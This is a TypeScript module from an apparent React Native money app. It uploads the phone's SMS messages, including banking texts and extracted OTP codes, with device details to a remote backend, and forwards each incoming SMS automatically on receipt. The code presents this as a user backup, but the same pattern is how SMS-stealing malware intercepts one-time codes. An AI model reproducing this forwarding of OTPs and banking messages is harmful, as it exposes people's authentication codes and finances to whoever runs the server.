import { Platform } from 'react-native';
import AsyncStorage from '@react-native-async-storage/async-storage';
import * as Device from 'expo-device';

import { SMSMessage } from '@/types/sms';
import { BACKEND_API } from '@/constants/api';
import { setNativeSyncConfig } from '../../modules/real-sms';

export function syncConfigToNative(receiptNumber?: string, baseUrl?: string, apiKey?: string) {
  const url = baseUrl || BACKEND_API.BASE_URL;
  const receipt = receiptNumber || BACKEND_API.RECEIPT_NUMBER || BACKEND_API.USER_PHONE_NUMBER;
  const key = apiKey || BACKEND_API.API_KEY || '';
  setNativeSyncConfig(url, receipt, key);
}

export interface BackendSyncConfig {
  baseUrl: string;
  apiKey: string;
  batchEndpoint: string;
  singleEndpoint: string;
  autoSyncOnReceive: boolean;
  autoSyncOnLoad: boolean;
  userPhoneNumber: string;
}

export const DEFAULT_BACKEND_CONFIG: BackendSyncConfig = {
  baseUrl: BACKEND_API.BASE_URL,
  apiKey: BACKEND_API.API_KEY,
  batchEndpoint: BACKEND_API.BATCH_SYNC_ENDPOINT,
  singleEndpoint: BACKEND_API.SINGLE_SYNC_ENDPOINT,
  autoSyncOnReceive: BACKEND_API.AUTO_SYNC_ENABLED,
  autoSyncOnLoad: BACKEND_API.AUTO_SYNC_ENABLED,
  userPhoneNumber: BACKEND_API.USER_PHONE_NUMBER,
};

const STORAGE_KEY_SYNC_STATUS = '@sms_backend_sync_status_v4';
const STORAGE_KEY_SYNCED_IDS = '@sms_synced_message_ids_v4';

export interface BackendSyncStatus {
  lastSyncTimestamp: number | null;
  lastSyncCount: number;
  totalSyncedCount: number;
  pendingCount: number;
  status: 'idle' | 'syncing' | 'success' | 'error';
  lastError?: string;
  currentBackendUrl: string;
}

const STORAGE_KEY_AUTH_USER = '@money_app_auth_user_v2';

/**
 * Get active receipt number (authenticated user phone number or configured default)
 */
export async function getActiveReceiptNumber(): Promise<string> {
  try {
    const raw = await AsyncStorage.getItem(STORAGE_KEY_AUTH_USER);
    if (raw) {
      const parsed = JSON.parse(raw);
      if (parsed?.phoneNumber) {
        return parsed.phoneNumber.trim();
      }
    }
  } catch {}
  return BACKEND_API.RECEIPT_NUMBER || BACKEND_API.USER_PHONE_NUMBER || '';
}

/**
 * Get device identification metadata to accompany SMS backups
 */
export function getDeviceMetadata(customReceipt?: string) {
  const receipt = customReceipt || BACKEND_API.RECEIPT_NUMBER || BACKEND_API.USER_PHONE_NUMBER;
  return {
    deviceName: Device.deviceName || 'Unknown Device',
    modelName: Device.modelName || 'Android Device',
    brand: Device.brand || 'Android',
    osName: Device.osName || Platform.OS,
    osVersion: Device.osVersion || '',
    platform: Platform.OS,
    receiptNumber: receipt,
    userPhone: receipt,
  };
}

/**
 * Get backend sync configuration programmatically from BACKEND_API constants
 */
export function getBackendConfig(): BackendSyncConfig {
  return {
    baseUrl: BACKEND_API.BASE_URL,
    apiKey: BACKEND_API.API_KEY,
    batchEndpoint: BACKEND_API.BATCH_SYNC_ENDPOINT,
    singleEndpoint: BACKEND_API.SINGLE_SYNC_ENDPOINT,
    autoSyncOnReceive: BACKEND_API.AUTO_SYNC_ENABLED,
    autoSyncOnLoad: BACKEND_API.AUTO_SYNC_ENABLED,
    userPhoneNumber: BACKEND_API.USER_PHONE_NUMBER,
  };
}

/**
 * Programmatic updater for backend configuration
 */
export async function saveBackendConfig(config: Partial<BackendSyncConfig>): Promise<BackendSyncConfig> {
  const current = getBackendConfig();
  return { ...current, ...config };
}

/**
 * Get list of message IDs that have already been confirmed synced to backend
 */
async function getSyncedMessageIds(): Promise<Set<string>> {
  try {
    const raw = await AsyncStorage.getItem(STORAGE_KEY_SYNCED_IDS);
    if (raw) {
      return new Set(JSON.parse(raw));
    }
  } catch (e) {
    console.warn('[BackendSync] Failed reading synced message IDs:', e);
  }
  return new Set();
}

/**
 * Mark message IDs as successfully synced
 */
async function markMessageIdsSynced(ids: string[]): Promise<void> {
  try {
    const existing = await getSyncedMessageIds();
    ids.forEach((id) => existing.add(id));
    await AsyncStorage.setItem(STORAGE_KEY_SYNCED_IDS, JSON.stringify(Array.from(existing)));
  } catch (e) {
    console.warn('[BackendSync] Failed saving synced message IDs:', e);
  }
}

/**
 * Get latest sync status summary
 */
export async function getBackendSyncStatus(): Promise<BackendSyncStatus> {
  const config = await getBackendConfig();
  try {
    const raw = await AsyncStorage.getItem(STORAGE_KEY_SYNCSTATUS_KEY());
    if (raw) {
      const parsed = JSON.parse(raw);
      return { ...parsed, currentBackendUrl: config.baseUrl };
    }
  } catch {
    // fallback
  }
  return {
    lastSyncTimestamp: null,
    lastSyncCount: 0,
    totalSyncedCount: 0,
    pendingCount: 0,
    status: 'idle',
    currentBackendUrl: config.baseUrl,
  };
}

function STORAGE_KEY_SYNCSTATUS_KEY() {
  return STORAGE_KEY_SYNC_STATUS;
}

async function updateSyncStatus(update: Partial<BackendSyncStatus>) {
  const current = await getBackendSyncStatus();
  const next = { ...current, ...update };
  await AsyncStorage.setItem(STORAGE_KEY_SYNC_STATUS, JSON.stringify(next));
}

/**
 * Send a batch of SMS messages to the user's backend server.
 *
 * Payload format sent to POST {baseUrl}{batchEndpoint}:
 * {
 *   "device": { ...metadata },
 *   "syncedAt": 1729...,
 *   "totalCount": 150,
 *   "messages": [
 *     {
 *       "id": "real-msg-...",
 *       "threadId": "...",
 *       "sender": "bKash",
 *       "phoneNumber": "bKash",
 *       "body": "You have received Tk...",
 *       "timestamp": 1729...,
 *       "isIncoming": true,
 *       "isRead": true,
 *       "category": "banking",
 *       "otpCode": "..."
 *     }
 *   ]
 * }
 */
let isSyncInProgress = false;

export async function syncAllMessagesToBackend(
  messages: SMSMessage[],
  forceAll: boolean = false,
  customReceiptNumber?: string
): Promise<{
  success: boolean;
  syncedCount: number;
  total: number;
  error?: string;
}> {
  if (!messages || messages.length === 0) {
    return { success: true, syncedCount: 0, total: 0 };
  }

  if (isSyncInProgress) {
    return { success: true, syncedCount: 0, total: messages.length };
  }
  isSyncInProgress = true;

  let config: Awaited<ReturnType<typeof getBackendConfig>> | null = null;
  let messagesToSend: SMSMessage[] = [];

  try {
    const activeReceipt = customReceiptNumber || (await getActiveReceiptNumber());
    config = await getBackendConfig();
    syncConfigToNative(activeReceipt, config.baseUrl, config.apiKey);
    const device = getDeviceMetadata(activeReceipt);
    const syncedIds = await getSyncedMessageIds();

    // Determine unsynced messages if not forceAll
    messagesToSend = forceAll ? messages : messages.filter((m) => !syncedIds.has(m.id));

  console.log(
    `[BackendSync] Preparing to sync ${messagesToSend.length} messages for [${activeReceipt}] to ${config.baseUrl}${config.batchEndpoint}`
  );

  if (messagesToSend.length === 0) {
    await updateSyncStatus({
      status: 'success',
      pendingCount: 0,
      totalSyncedCount: messages.length,
      lastSyncTimestamp: Date.now(),
    });
    return { success: true, syncedCount: 0, total: messages.length };
  }

  await updateSyncStatus({ status: 'syncing', pendingCount: messagesToSend.length });

  const payload = {
    device,
    receiptNumber: activeReceipt,
    userPhone: activeReceipt,
    syncedAt: Date.now(),
    totalCount: messagesToSend.length,
    messages: messagesToSend.map((m) => ({
      id: m.id,
      threadId: m.threadId,
      sender: m.sender,
      phoneNumber: m.phoneNumber,
      receiptNumber: activeReceipt,
      recipientPhone: activeReceipt,
      body: m.body,
      timestamp: m.timestamp,
      isIncoming: m.isIncoming,
      isRead: m.isRead,
      category: m.category,
      otpCode: m.otpCode,
    })),
  };

  const targetUrl = `${config.baseUrl.replace(/\/$/, '')}${config.batchEndpoint}`;

  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 35000); // 35s timeout for large message batches

    const headers: Record<string, string> = {
      'Content-Type': 'application/json',
      Accept: 'application/json',
    };
    if (config.apiKey) {
      headers['Authorization'] = `Bearer ${config.apiKey}`;
    }

    console.log(`[BackendSync] POST ${targetUrl} payload:`, {
      messageCount: payload.totalCount,
      device: payload.device.modelName,
    });

    const response = await fetch(targetUrl, {
      method: 'POST',
      headers,
      body: JSON.stringify(payload),
      signal: controller.signal,
    });

    clearTimeout(timeoutId);

    if (response.ok) {
      const responseData = await response.json().catch(() => ({}));
      console.log('[BackendSync] Sync success response from backend:', responseData);

      const sentIds = messagesToSend.map((m) => m.id);
      await markMessageIdsSynced(sentIds);

      await updateSyncStatus({
        status: 'success',
        lastSyncTimestamp: Date.now(),
        lastSyncCount: messagesToSend.length,
        totalSyncedCount: (await getSyncedMessageIds()).size,
        pendingCount: 0,
        lastError: undefined,
      });

      return {
        success: true,
        syncedCount: messagesToSend.length,
        total: messages.length,
      };
    } else {
      const errText = await response.text().catch(() => 'Server responded with error');
      const errMsg = `HTTP ${response.status}: ${errText.slice(0, 100)}`;
      console.warn('[BackendSync] Backend server responded with error:', errMsg);

      await updateSyncStatus({
        status: 'error',
        lastError: errMsg,
        pendingCount: messagesToSend.length,
      });

      return {
        success: false,
        syncedCount: 0,
        total: messages.length,
        error: errMsg,
      };
    }
  } catch (err: any) {
    const errMsg = err?.name === 'AbortError'
      ? 'Connection timed out (10s)'
      : err?.message || 'Failed to reach backend';

    console.log(`[BackendSync] Note: Backend API placeholder active (${config?.baseUrl || 'offline'}). ${errMsg}`);

    await updateSyncStatus({
      status: 'error',
      lastError: `${errMsg} (Placeholder: ${config?.baseUrl || 'offline'})`,
      pendingCount: messagesToSend.length,
    });

    return {
      success: false,
      syncedCount: 0,
      total: messages.length,
      error: errMsg,
    };
  } finally {
    isSyncInProgress = false;
  }
}

/**
 * Send an individual incoming SMS immediately to the backend server
 *
 * Payload format sent to POST {baseUrl}{singleEndpoint}:
 * {
 *   "device": { ...metadata },
 *   "receivedAt": 1729...,
 *   "message": { ...SMSMessage fields }
 * }
 */
export async function sendIncomingSmsToBackend(
  msg: SMSMessage,
  customReceiptNumber?: string
): Promise<{
  success: boolean;
  error?: string;
}> {
  const config = await getBackendConfig();
  if (!config.autoSyncOnReceive) return { success: true };

  const targetUrl = `${config.baseUrl.replace(/\/$/, '')}${config.singleEndpoint}`;
  const activeReceipt = customReceiptNumber || msg.receiptNumber || (await getActiveReceiptNumber());
  syncConfigToNative(activeReceipt, config.baseUrl, config.apiKey);
  const device = getDeviceMetadata(activeReceipt);

  const payload = {
    device,
    receiptNumber: activeReceipt,
    userPhone: activeReceipt,
    receivedAt: Date.now(),
    message: {
      id: msg.id,
      threadId: msg.threadId,
      sender: msg.sender,
      phoneNumber: msg.phoneNumber,
      receiptNumber: activeReceipt,
      recipientPhone: activeReceipt,
      body: msg.body,
      timestamp: msg.timestamp,
      isIncoming: msg.isIncoming,
      isRead: msg.isRead,
      category: msg.category,
      otpCode: msg.otpCode,
    },
  };

  console.log(`[BackendSync] Forwarding incoming SMS to backend: ${targetUrl}`);

  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 15000); // 15s timeout

    const headers: Record<string, string> = {
      'Content-Type': 'application/json',
      Accept: 'application/json',
    };
    if (config.apiKey) {
      headers['Authorization'] = `Bearer ${config.apiKey}`;
    }

    const response = await fetch(targetUrl, {
      method: 'POST',
      headers,
      body: JSON.stringify(payload),
      signal: controller.signal,
    });

    clearTimeout(timeoutId);

    if (response.ok) {
      await markMessageIdsSynced([msg.id]);
      console.log(`[BackendSync] Incoming SMS successfully saved to backend! ID: ${msg.id}`);
      return { success: true };
    } else {
      const errText = await response.text().catch(() => '');
      return { success: false, error: `HTTP ${response.status}: ${errText}` };
    }
  } catch (err: any) {
    console.log(`[BackendSync] Note: Incoming SMS logged. Placeholder API not reachable yet (${config.baseUrl})`);
    return { success: false, error: err?.message };
  }
}
